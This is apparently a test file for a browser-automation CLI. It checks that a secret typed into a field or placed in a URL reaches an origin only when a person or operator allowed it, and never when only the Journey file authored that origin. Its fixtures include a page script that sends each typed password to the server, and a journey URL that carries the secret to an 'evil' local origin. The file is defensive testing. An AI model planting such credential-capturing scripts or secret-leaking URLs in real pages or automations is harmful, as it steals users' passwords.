import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { createServer, type Server } from "node:http";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { ProfileManager } from "@jevitate/daemon";
import type { Journey } from "@jevitate/journey";
import { buildProgram } from "./program.js";
import type { CliDeps } from "./cli-shared.js";
import { useSkippingTime } from "../../explore/src/testkit.js";

/**
 * H4 (independent check): a `--secret-field` binding goes only to origins a person or operator named
 * (the run's own origin, the environment's, `--allow`, targets.json), never to an origin only the
 * Journey file authored in `metadata.allowedOrigins`. Real CLI, real Chromium, two served origins.
 */

const VALUE = "H4MarkerVal9Zq";
const VAR = "JEV_TEST_H4_PW";

let good: Server;
let evil: Server;
let goodOrigin: string;
let evilOrigin: string;
let root: string;
let journeysDir: string;
const evilSaw: string[] = [];

const page = (title: string): string =>
  `<h1>${title}</h1><label>Password <input type=password oninput="fetch('/got?v='+encodeURIComponent(this.value))"></label><p data-testid=here>${title}</p>`;

function listen(s: Server): Promise<string> {
  return new Promise((r) => s.listen(0, "127.0.0.1", () => r(`http://127.0.0.1:${(s.address() as { port: number }).port}`)));
}

function draft(id: string, secondUrl: string): Journey {
  return {
    metadata: { id, name: id, promoted: false, params: ["pw"], parameters: [{ name: "pw", secret: true }], allowedOrigins: [evilOrigin], createdAtIso: "2026-11-09T00:00:00.000Z" },
    recording: {
      version: "1",
      site: goodOrigin,
      pages: [
        {
          url: "/",
          steps: [
            { step: { kind: "navigate", url: "/", expect: { kind: "visible", target: { testId: "here" } } } },
            { step: { kind: "navigate", url: secondUrl, expect: { kind: "visible", target: { testId: "here" } } } },
            { step: { kind: "fill", target: { label: "Password" }, value: { var: "pw" }, expect: { kind: "visible", target: { testId: "here" } } } },
          ],
        },
      ],
    },
  } as unknown as Journey;
}

const cliDeps = (): CliDeps =>
  ({
    profiles: new ProfileManager(join(root, "profiles")),
    journeysDir,
    dbPath: join(root, "site.sqlite"),
    environmentsFile: join(root, "environments.json"),
    logs: { logsRoot: join(root, "logs") },
    explore: { targetsConfigPath: join(root, "targets.json") },
  }) as unknown as CliDeps;

async function cli(args: string[]): Promise<{ out: string; err: string }> {
  let out = "";
  let err = "";
  const program = buildProgram(cliDeps());
  program.exitOverride();
  const sinks = { writeOut: (s: string) => void (out += s), writeErr: (s: string) => void (err += s) };
  const apply = (c: typeof program): void => {
    c.configureOutput(sinks);
    for (const sub of c.commands) apply(sub as typeof program);
  };
  apply(program);
  const saved = process.exitCode;
  try {
    await program.parseAsync(args, { from: "user" });
    return { out, err };
  } finally {
    process.exitCode = saved;
  }
}

beforeAll(async () => {
  good = createServer((_req, res) => void res.writeHead(200, { "content-type": "text/html" }).end(page("good")));
  evil = createServer((req, res) => {
    evilSaw.push(decodeURIComponent(req.url ?? ""));
    res.writeHead(200, { "content-type": "text/html" }).end(page("evil"));
  });
  goodOrigin = await listen(good);
  evilOrigin = await listen(evil);
  root = mkdtempSync(join(tmpdir(), "jev-h4-"));
  journeysDir = join(root, "journeys");
  mkdirSync(journeysDir, { recursive: true });
  const write = (j: Journey): void => writeFileSync(join(journeysDir, `${j.metadata.id}.json`), JSON.stringify(j));
  write(draft("evil-field", `${evilOrigin}/login`));
  write(draft("evil-url", `${evilOrigin}/cb?t=\${pw}`));
  writeFileSync(join(root, "environments.json"), "{}");
  writeFileSync(join(root, "targets.json"), "{}");
});

afterAll(() => {
  vi.unstubAllEnvs();
  for (const s of [good, evil]) {
    s.closeAllConnections();
    s.close();
  }
  rmSync(root, { recursive: true, force: true });
});

beforeEach(() => {
  vi.unstubAllEnvs();
  vi.stubEnv(VAR, VALUE);
  vi.stubEnv("JEVITATE_RUN_RECORD", "");
  evilSaw.length = 0;
});

describe("H4: a --secret-field binding never reaches an origin only the Journey authored", { timeout: 120_000 }, () => {
  useSkippingTime();

  it("a draft that navigates to its authored evil origin and types the secret there: refused at the field, the value never sent", async () => {
    const r = await cli(["journey", "run", "evil-field", "--secret-field", `label=Password=env:${VAR}`, "--json"]);
    expect(evilSaw.some((u) => u.startsWith("/login")), "the draft did reach the evil page").toBe(true);
    expect(evilSaw.filter((u) => u.includes(VALUE))).toEqual([]);
    expect(r.out + r.err).toContain("E_SECRET_ORIGIN_REFUSED");
    expect(r.out + r.err).not.toContain(VALUE);
  });

  it("a draft whose navigate URL carries the secret to its authored evil origin: refused before any browser", async () => {
    const r = await cli(["journey", "run", "evil-url", "--secret-field", `param=pw=env:${VAR}`, "--json"]);
    expect(evilSaw).toEqual([]);
    expect(r.out + r.err).toContain("E_SECRET_ORIGIN_REFUSED");
    expect(r.out + r.err).not.toContain(VALUE);
  });

  it("the person's --allow names the other origin: the secret goes there, as the person chose", async () => {
    const r = await cli(["journey", "run", "evil-field", "--secret-field", `label=Password=env:${VAR}`, "--allow", evilOrigin, "--json"]);
    expect(r.out + r.err).not.toContain("E_SECRET_ORIGIN_REFUSED");
    expect(evilSaw.some((u) => u.includes(VALUE))).toBe(true);
  });
});
